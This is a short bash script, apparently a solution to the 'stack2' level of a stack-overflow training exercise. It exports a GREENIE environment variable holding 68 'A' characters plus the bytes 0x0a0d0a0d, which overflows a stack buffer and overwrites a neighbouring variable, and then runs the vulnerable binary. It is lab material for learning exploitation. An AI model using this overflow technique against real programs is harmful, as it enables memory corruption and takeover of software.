#!/bin/bash

GREENIE=`python -c 'print "A"*68 + "\x0a\x0d\x0a\x0d"'`
export GREENIE
./stack2